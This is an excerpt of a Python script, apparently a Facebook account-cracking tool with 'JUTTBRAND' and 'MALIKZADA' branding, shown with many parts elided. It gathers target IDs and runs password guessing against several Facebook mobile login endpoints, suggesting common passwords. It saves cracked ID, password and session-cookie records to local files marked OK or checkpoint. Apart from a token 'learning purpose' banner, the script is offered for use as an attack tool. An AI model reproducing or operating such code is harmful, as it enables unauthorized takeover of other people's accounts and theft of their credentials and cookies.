...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mSaoud')
...
⠀⠀⠀⠀⠀          ⠀⠀⠀⠈⠙⠛⠶⠶⠦⠤⠤⠤⠶⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀
  {m}•{k}•{h}•{sir} THIS TOOL IS ONLY FOR LEARNING PURPOSE {x}{m}•{k}•{h}•{x}
    ...
    \t{asu}    {m}•{k}•{h}•{sir} RECODE : JUTTBRAND {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		print(f'{h}        Get Cookies From Kiwi Browser Extension{h}{x}')
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{u}] Enter Cookies :{M} ')
		...
		print(f'  {u}[{h}•{u}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{k} ');time.sleep(1)
		print(f'  {u}[{h}•{u}]{h} press :Ctrl+p to go forward {k} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK COOKIES !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	malikzada(f'Your Ip  :{b}{ip}{x}')
	print('')
	print('1. Public ')
	print('2. Crack File ')
	print('E. Exit')
	_____cowok__MALIKZADA_____ = input('\nEnter  : ')
	if _____cowok__MALIKZADA_____ in ['1']:
		dump_massal()
	elif _____cowok__MALIKZADA_____ in ['2']:
		crack_file()
	elif _____cowok__MALIKZADA_____ in ['E']:
...
def dump_massal():
	...
	try:
		...
		print(f'{k} Friendlidt Not Public {x}')
		time.sleep(3)
		back()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
...
def setting():
	...
	print('')
	print('1. Crack Old  ')
	print(f'2. Crack New {h} Recommended{h}{x}')
	print(f'3. Random {h}Highly Recommended{h}{x}')
	print('')
	hu = input('Enter  : ')
	if hu in ['1','01']:
	...
	clear()
	banner()
	print(f'1. m.facebook ')
	print(f'2. mbasic.facebook')
	print(f'3. free.facebook')
	print(f'4. x.facebook')
	print(f'5. p.facebook ')
	print(f'6. d.facebook')
	print('')
	hc = input('>> Enter  : ')
	if hc in ['1','01']:
...
#		method.append('free')
		...
		method.append('mobile')
	print(f'{b}NOTE:\n🎀{k}RECOMMENDED NOT TO DISPLAY THE APPLICATION\n🎀RECOMMENDED TO USE A DEPAULT PASSWORD{b}{x} ') 
	print('')
...
#	else:
#		taplikasi.append('no')
	pwplus=input('Add Password Manual/default( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Enter an additional password of at least 6 characters\nExample :[green] 14august,223344,123456[white] ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}JUTTBRAND-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}AWAIS-OK>> {idf}|{pw}{h}{x}') 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'AWAIS-CP[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='MALIKZADA-XD CP'))
					open('/sdcard/AWAIS-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/AWAIS-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'AWAIS-OK[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='MALIKZADA-XD OK'))
					ok+=1
					break
					...
					hit=0
					infoakun += (f"\n[bold yellow]AWAIS-CP[•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green]MALIKZADA-OK😘[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]MALIKZADA-XD OK[/bold green]'))
					ok+=1
					break
